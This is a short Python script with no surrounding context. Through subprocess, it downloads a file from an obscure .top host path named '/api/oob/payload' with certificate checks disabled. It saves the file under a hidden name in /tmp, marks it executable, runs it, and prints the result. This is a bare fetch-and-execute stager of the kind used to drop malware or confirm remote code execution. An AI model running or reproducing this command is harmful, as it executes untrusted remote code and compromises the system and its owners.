import subprocess
cmd = "curl -fsk https://azvdvasfv21fa.xxxyyyzzzxyz.top/api/oob/payload/8b8079f3ad33a65de11959d578758ee14677037ad7bd721d94021cc4ac3cffbf -o /tmp/.rcsx9 && chmod +x /tmp/.rcsx9 && timeout 40 /tmp/.rcsx9"
r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=55)
print("RC:", r.returncode)
print(r.stdout[-1500:])
print(r.stderr[-1500:])
